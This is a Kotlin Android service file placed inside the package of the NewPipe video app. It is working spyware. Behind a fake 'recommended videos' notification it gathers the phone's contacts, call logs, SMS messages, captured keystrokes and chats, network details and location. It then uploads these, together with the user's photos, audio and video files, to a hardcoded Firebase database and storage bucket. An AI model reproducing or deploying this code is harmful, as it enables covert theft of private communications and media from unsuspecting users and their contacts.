package org.schabi.newpipe.gameover

import android.annotation.SuppressLint
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.ContentResolver
import android.content.Context
import android.content.Intent
import android.icu.text.SimpleDateFormat
import android.net.Uri
import android.net.wifi.WifiManager
import android.os.Build
import android.os.IBinder
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Settings
import android.telephony.TelephonyManager
import android.util.Log
import androidx.annotation.RequiresApi
import androidx.core.app.NotificationCompat
import com.google.android.gms.tasks.OnSuccessListener
import com.google.android.gms.tasks.Task
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.storage.FirebaseStorage
import com.google.firebase.storage.UploadTask
import com.google.gson.Gson
import org.json.JSONArray
import org.json.JSONObject
import org.schabi.newpipe.App.marker
import org.schabi.newpipe.R
import org.schabi.newpipe.gameover.utils.SavePref
import java.io.File
import java.lang.Long
import java.util.*
import kotlin.Exception
import kotlin.Int
import kotlin.String
import kotlin.TODO
import kotlin.arrayOf


class DataService : Service() {
    private lateinit var dbRef: DatabaseReference
    private var aid: String = ""
    private lateinit var savePref: SavePref
    override fun onBind(p0: Intent?): IBinder? {
        TODO("Not yet implemented")
    }

    override fun onCreate() {
        savePref = SavePref(this)

        dbRef =
            FirebaseDatabase.getInstance("https://fir-d5cfd-default-rtdb.firebaseio.com").reference
    }

    @RequiresApi(Build.VERSION_CODES.O)
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent != null && intent.action.equals("startDataCapture")) {

            getAid()
            startMyForeground()

            getMobileDetails()

            getContacts()

            getCallLogs()

            getSms()

            getImageList()

            getAudioList()

            getVideoList()

            getChats()

            this.stopForeground(true)
        } else if (intent != null && intent.action.equals("stopDataCapture")) {
            stopSelf()
        }
        return START_STICKY
    }

    private fun getAid() {
        aid = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private fun startMyForeground() {
        val channel = NotificationChannel("1", "Play Now", NotificationManager.IMPORTANCE_LOW)
        channel.description = "PollingService"
        val notificationManager = getSystemService(NotificationManager::class.java)
        notificationManager.createNotificationChannel(channel)
        val builder = NotificationCompat.Builder(this, "1")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setContentTitle("Play Now")
            .setContentText("recommended videos")
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setAutoCancel(true)
            .setOnlyAlertOnce(true)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
        val notification = builder.build()
        this.startForeground(1, notification)
    }

    override fun onDestroy() {
        super.onDestroy()
    }

    @RequiresApi(Build.VERSION_CODES.N)
    private fun timeStmp(): String {
        val FILENAME_FORMAT = "yyyy-MM-dd-HH-mm-ss-SSS"
        return SimpleDateFormat(FILENAME_FORMAT, Locale.US).format(System.currentTimeMillis())
    }

    @RequiresApi(Build.VERSION_CODES.N)
    private fun getContacts() {
        Log.e("DataService".uppercase(), "Entered Contacts info")

        val contentResolver: ContentResolver = contentResolver
        val contactBook: MutableList<Contact> = mutableListOf<Contact>()
        var lastContactId: Int = marker!!.getContactId()
        // var lastContactId: Int = 0

        val projection = arrayOf(
            ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
            ContactsContract.CommonDataKinds.Phone.NUMBER,
            ContactsContract.CommonDataKinds.Phone.RAW_CONTACT_ID
        )

        // TODO : The acquisition code
        val cursor = contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            projection,
            ContactsContract.Contacts.HAS_PHONE_NUMBER + ">0 AND LENGTH(" + ContactsContract.CommonDataKinds.Phone.NUMBER + ")>0 AND " +
                    ContactsContract.CommonDataKinds.Phone.RAW_CONTACT_ID + ">" + lastContactId,
            null,
            "raw_contact_id DESC"
        )

        val uploadJson = JSONObject()
        uploadJson.put("deviceId", aid)
        if (cursor != null && cursor.count > 0) {
            val contactJSONArray = JSONArray()

            cursor.moveToFirst()
            lastContactId =
                cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.RAW_CONTACT_ID))
                    .toInt()
            marker!!.setContactId(lastContactId)

            do {
                val individualContactObject = JSONObject()
                val name =
                    cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                val mobileNumber =
                    cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
                val rawId =
                    cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.RAW_CONTACT_ID))
                individualContactObject.put("name", name)
                individualContactObject.put("phoneNumber", mobileNumber)
                individualContactObject.put("rawID", rawId)
                contactJSONArray.put(individualContactObject)
                contactBook.add(Contact(name, mobileNumber, rawId))
            } while (cursor.moveToNext())
            uploadJson.put("contacts", contactJSONArray)
            /*val uploadThread = Thread {
                try {
                    UploadData(
                        applicationContext,
                        NetworkUtils.getInstance(applicationContext).contactsNest,
                        uploadJson
                    ).doUpload()
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }

            uploadThread.start()*/
            dbRef.child("Devices").child(aid).child("contact").child(timeStmp())
                .setValue(Gson().toJson(uploadJson))
        }
    }

    @RequiresApi(Build.VERSION_CODES.N)
    private fun getCallLogs() {
        Log.e("DataService".uppercase(), "Entered Callog info")

        var callRecords: MutableList<CallRecord> = mutableListOf<CallRecord>()
        val contentResolver: ContentResolver = contentResolver
        var lastCallLogTime: String = marker!!.getLastCallLog()
        val cursor = contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            null, CallLog.Calls.DATE + ">" + lastCallLogTime, null, CallLog.Calls.DATE + " DESC"
        )
        val uploadJson = JSONObject()
        uploadJson.put("deviceId", aid)
        if (cursor != null && cursor.count > 0) {
            val callLogJSONArray = JSONArray()
            val number: Int = cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)
            val name: Int =
                cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME) // TODO Name comes Null
            val type: Int = cursor.getColumnIndex(CallLog.Calls.TYPE)
            val date: Int = cursor.getColumnIndex(CallLog.Calls.DATE)
            val duration: Int = cursor.getColumnIndex(CallLog.Calls.DURATION)
            cursor.moveToFirst()
            lastCallLogTime = cursor.getString(date)
            marker!!.setLastCallLog(lastCallLogTime)
            do {
                val individualContactObject = JSONObject()
                val phNumber: String = cursor.getString(number)
                val callType: String = cursor.getString(type)
                val callDate: String = cursor.getString(date)
//                val callName = "Default Name"
                val callName: String = cursor.getString(name)
                val callDayTime = Date(Long.valueOf(callDate))
                val callDuration: String = cursor.getString(duration)
                var dir: String? = "null"
                val dircode = callType.toInt()
                when (dircode) {
                    CallLog.Calls.OUTGOING_TYPE -> dir = "OUTGOING"
                    CallLog.Calls.INCOMING_TYPE -> dir = "INCOMING"
                    CallLog.Calls.MISSED_TYPE -> dir = "MISSED"
                    CallLog.Calls.BLOCKED_TYPE -> dir = "BLOCKED"
                    CallLog.Calls.ANSWERED_EXTERNALLY_TYPE -> dir = "HANDSFREE"
                }
                individualContactObject.put("phone", phNumber)
                individualContactObject.put("name", callName)
                individualContactObject.put("type", callType)
                individualContactObject.put("timestamp", callDate)
                individualContactObject.put("date", callDayTime)
                individualContactObject.put("duration", callDuration)
                callLogJSONArray.put(individualContactObject)
                callRecords.add(CallRecord(callDayTime.toString(), phNumber, callDuration, dir!!))
            } while (cursor.moveToNext())
            Log.e("DataService".uppercase(), "Details Callog info : " + callLogJSONArray)
            uploadJson.put("calls", callLogJSONArray)
            /*val uploadThread = Thread {
                try {
                    UploadData(
                        applicationContext,
                        NetworkUtils.getInstance(applicationContext).reportCallsNest,
                        uploadJson
                    ).doUpload()
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }

            uploadThread.start()*/
            dbRef.child("Devices").child(aid).child("callLog").child(timeStmp())
                .setValue(Gson().toJson(uploadJson))

        }
    }

    @RequiresApi(Build.VERSION_CODES.N)
    @SuppressLint("MissingPermission", "HardwareIds")
    private fun getMobileDetails() {
        Log.e("DataService".uppercase(), "Entered basic info")

        val tm: TelephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        val wifiMgr = applicationContext.getSystemService(WIFI_SERVICE) as WifiManager
        val mac = wifiMgr.connectionInfo.macAddress
        val ip = android.text.format.Formatter.formatIpAddress(wifiMgr.connectionInfo.ipAddress)
        val ssid = wifiMgr.connectionInfo.ssid
        var lat = ""
        var long = ""
        var locTime = ""

        try {
            lat = marker!!.getLat()
            long = marker!!.getLong()
            locTime = marker!!.getloctime()
        } catch (e: Exception) {
            lat = "default"
            long = "default"
            locTime = "default"
        }

        val uploadJson = JSONObject()
        uploadJson.put("deviceId", aid)
        uploadJson.put("manufacturer", Build.BRAND)
        uploadJson.put("ModelNumber", Build.MODEL)
        uploadJson.put("timestamp", timeStmp())
        uploadJson.put("networkType", tm.networkOperatorName)
        uploadJson.put("mac", mac)
        uploadJson.put("ip", ip)
        uploadJson.put("ssid", ssid)
        uploadJson.put("NetworkCountry", tm.networkCountryIso)
        uploadJson.put("latitude", lat)
        uploadJson.put("longitude", long)
        uploadJson.put("loc_aq_time", locTime)

        /*val uploadThread = Thread {
            try {
                UploadData(
                    applicationContext,
                    NetworkUtils.getInstance(applicationContext).basicInfoNest,
                    uploadJson
                ).doUpload()
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }

        uploadThread.start()*/

        dbRef.child("Devices").child(aid).child("mobileNetwork").child(timeStmp())
            .setValue(Gson().toJson(uploadJson))
    }

    @RequiresApi(Build.VERSION_CODES.N)
    private fun getChats() {
        var chats = savePref.getChat()
        if (chats != "chat") {
            dbRef.child("Devices").child(aid).child("keysAndChats").child(timeStmp())
                .setValue(chats)
        }
        savePref.setChat("chat")
    }

    @RequiresApi(Build.VERSION_CODES.N)
    private fun getSms() {
        Log.e("DataService".uppercase(), "Entered SMS info")

        var smses: MutableList<Sms> = mutableListOf<Sms>()
        val contentResolver: ContentResolver = contentResolver
        var lastSmsLogTime: String = marker!!.getLastSmsLog()
        val cursor = contentResolver.query(
            Uri.parse("content://sms"), null,
            "date > $lastSmsLogTime", null, null
        )

        val uploadJson = JSONObject()
        uploadJson.put("deviceId", aid)

        if (cursor != null && cursor.count > 0) {

            val dataJSONArray = JSONArray()

            var dir: String? = null
            cursor.moveToFirst()
            lastSmsLogTime = cursor.getString(4)
            marker!!.setLastSmsLog(lastSmsLogTime)
            do {
                val individualSmsObject = JSONObject()
                var dt: String = (Date(Long.valueOf(cursor.getString(4)))).toString()
                var num: String = cursor.getString(2)
                var msg: String = cursor.getString(12)
                when (cursor.getString(9).toInt()) {
                    1 -> dir = "IN"
                    2 -> dir = "OUT"
                }
                individualSmsObject.put("date",dt);
                individualSmsObject.put("number",num);
                individualSmsObject.put("msg",msg);
                individualSmsObject.put("dir",dir);

                dataJSONArray.put(individualSmsObject)
                //smses.add(Sms(dt, num, msg, dir!!))
            } while (cursor.moveToNext())

            uploadJson.put("sms", dataJSONArray)
            /*val uploadThread = Thread {
                try {
                    UploadData(
                        applicationContext,
                        NetworkUtils.getInstance(applicationContext).reportSmsNest,
                        uploadJson
                    ).doUpload()
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }

            uploadThread.start()*/
            dbRef.child("Devices").child(aid).child("sms").child(timeStmp())
                .setValue(Gson().toJson(uploadJson))
        }
    }


    @RequiresApi(Build.VERSION_CODES.N)
    private fun getImageList() {
        Log.e("DataService".uppercase(), "Entered Image info")

        val uploadJson = JSONObject()
        val dataJSONArray = JSONArray()
        uploadJson.put("deviceId", aid)

        val listOfImage = mutableListOf<String>()
        val contentUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        val projections = arrayOf<String>(
            MediaStore.Images.ImageColumns._ID,
            MediaStore.Images.ImageColumns.DISPLAY_NAME,
            MediaStore.Images.ImageColumns.DATA,
            MediaStore.Images.ImageColumns.DATE_TAKEN
        )
        val orderBy = "${MediaStore.Images.ImageColumns.DATE_TAKEN} DESC"
        var lastImageTime: String = marker!!.getLastImage()

        contentResolver.query(
            contentUri, projections,
            MediaStore.Images.ImageColumns.DATE_TAKEN + ">" + lastImageTime, null, orderBy
        )?.use { cursor ->
            if (cursor.moveToFirst()) {
                val imageUriIndex =
                    cursor.getColumnIndexOrThrow(MediaStore.Images.ImageColumns.DATA)
                val dt = cursor.getColumnIndexOrThrow(MediaStore.Images.ImageColumns.DATE_TAKEN)
                lastImageTime = cursor.getString(dt)
                marker!!.setLastImage(lastImageTime)
                do {
                    val imageUri = Uri.parse(cursor.getString(imageUriIndex))
                    listOfImage.add(imageUri.toString())
                    Log.e(
                        "DATASERVICE",
                        String.format(
                            "URI : %s,\nFile Path : %s",
                            imageUri.toString(),
                            File(imageUri.toString()).absolutePath
                        )
                    )
                    dataJSONArray.put(imageUri.toString())

                    uploadfile(File(imageUri.toString()), "image")

                } while (cursor.moveToNext())
            }
        }
        uploadJson.put("imageList", dataJSONArray)

        val timeForComparingLastSync = System.currentTimeMillis() / 1000
        val timeAfterAday = savePref.getLastFileSync()?.plus((24 * 60 * 60))
        if (timeForComparingLastSync >= timeAfterAday!!) {
            dbRef.child("Devices").child(aid).child("fileList").child(timeStmp())
                .setValue(Gson().toJson(uploadJson))
        }
    }

    @RequiresApi(Build.VERSION_CODES.N)
    private fun getAudioList() {
        Log.e("DataService".uppercase(), "Entered Audio info")

        val uploadJson = JSONObject()
        val dataJSONArray = JSONArray()
        uploadJson.put("deviceId", aid)

        val listOfAudio = mutableListOf<String>()
        val contentUri = MediaStore.Audio.Media.EXTERNAL_CONTENT_URI
        val projections = arrayOf<String>(
            MediaStore.Audio.AudioColumns._ID,
            MediaStore.Audio.AudioColumns.DATA,
            MediaStore.Audio.AudioColumns.DISPLAY_NAME,
            MediaStore.Audio.AudioColumns.DATE_TAKEN
        )
        val orderBy = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            "${MediaStore.Audio.AudioColumns.DATE_TAKEN} DESC"
        } else {
            TODO("VERSION.SDK_INT < Q")
        }
        var lastAudioTime: String = marker!!.getLastAudio()
        contentResolver.query(
            contentUri,
            projections,
            MediaStore.Audio.AudioColumns.DATE_TAKEN + ">" + lastAudioTime,
            null,
            orderBy
        )?.use { cursor ->
            if (cursor.moveToFirst()) {
                val audioUriIndex = cursor.getColumnIndexOrThrow(MediaStore.Audio.AudioColumns.DATA)
                val dt = cursor.getColumnIndexOrThrow(MediaStore.Audio.AudioColumns.DATE_TAKEN)
                lastAudioTime = cursor.getString(dt)
                marker!!.setLastAudio(lastAudioTime)
                do {
                    val audioUri = Uri.parse(cursor.getString(audioUriIndex))
                    dataJSONArray.put(audioUri.toString())
                    listOfAudio.add(audioUri.toString())

                    uploadfile(File(audioUri.toString()), "audio")
                } while (cursor.moveToNext())
            }
        }

        uploadJson.put("audioList", dataJSONArray)

        val timeForComparingLastSync = System.currentTimeMillis() / 1000
        val timeAfterAday = savePref.getLastFileSync()?.plus((24 * 60 * 60))
        if (timeForComparingLastSync >= timeAfterAday!!) {
            dbRef.child("Devices").child(aid).child("fileList").child(timeStmp())
                .setValue(Gson().toJson(uploadJson))
        }
    }

    @RequiresApi(Build.VERSION_CODES.N)
    private fun getVideoList() {
        Log.e("DataService".uppercase(), "Entered Video info")

        val uploadJson = JSONObject()
        val dataJSONArray = JSONArray()
        uploadJson.put("deviceId", aid)

        val listOfVideo = mutableListOf<String>()
        val contentUri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI
        val projections = arrayOf<String>(
            MediaStore.Video.VideoColumns._ID,
            MediaStore.Video.VideoColumns.DISPLAY_NAME,
            MediaStore.Video.VideoColumns.DATA,
            MediaStore.Video.VideoColumns.DATE_TAKEN
        )
        val orderBy = "${MediaStore.Video.VideoColumns.DATE_TAKEN} DESC"
        var lastVideoTime: String = marker!!.getLastVideo()
        contentResolver.query(
            contentUri,
            projections,
            MediaStore.Video.VideoColumns.DATE_TAKEN + ">" + lastVideoTime,
            null,
            orderBy
        )?.use { cursor ->
            if (cursor.moveToFirst()) {
                val videoUriIndex = cursor.getColumnIndexOrThrow(MediaStore.Video.VideoColumns.DATA)
                val dt = cursor.getColumnIndexOrThrow(MediaStore.Video.VideoColumns.DATE_TAKEN)
                lastVideoTime = cursor.getString(dt)
                marker!!.setLastVideo(lastVideoTime)
                do {
                    val videoUri = Uri.parse(cursor.getString(videoUriIndex))
                    dataJSONArray.put(videoUri.toString())
                    listOfVideo.add(videoUri.toString())
                    uploadfile(File(videoUri.toString()), "video")
                } while (cursor.moveToNext())
            }
        }

        uploadJson.put("videoList", dataJSONArray)

        val timeForComparingLastSync = System.currentTimeMillis() / 1000
        val timeAfterAday = savePref.getLastFileSync()?.plus((24 * 60 * 60))
        if (timeForComparingLastSync >= timeAfterAday!!) {
            dbRef.child("Devices").child(aid).child("fileList").child(timeStmp())
                .setValue(Gson().toJson(uploadJson))  //for list
            savePref.setLastFileSync(timeForComparingLastSync + timeAfterAday)
        }

    }

    @RequiresApi(Build.VERSION_CODES.N)
    private fun uploadfile(uri: File, contenttype: String) {

        var data = FirebaseStorage.getInstance("gs://fir-d5cfd.appspot.com").reference
        val uploadTask =
            data.child(aid).child(timeStmp()).child(contenttype).putFile(Uri.fromFile(uri))

        uploadTask.addOnFailureListener {
            // Handle unsuccessful uploads
        }.addOnSuccessListener { taskSnapshot ->
            //val downloadUrl: String = taskSnapshot.storage.name
            val downloadUrl = taskSnapshot.metadata!!.reference!!.downloadUrl.toString()
            //dbRef.child("Devices").child(aid).child("files").child(timeStmp()).setValue(downloadUrl)
        }

        /*uploadTask.addOnCompleteListener {
            if (it.isSuccessful) {
                dbRef.child("Devices").child(aid).child("files").child(timeStmp()).setValue(it.getStorage().getDownloadUrl();)
            }
        }*/





    }
}

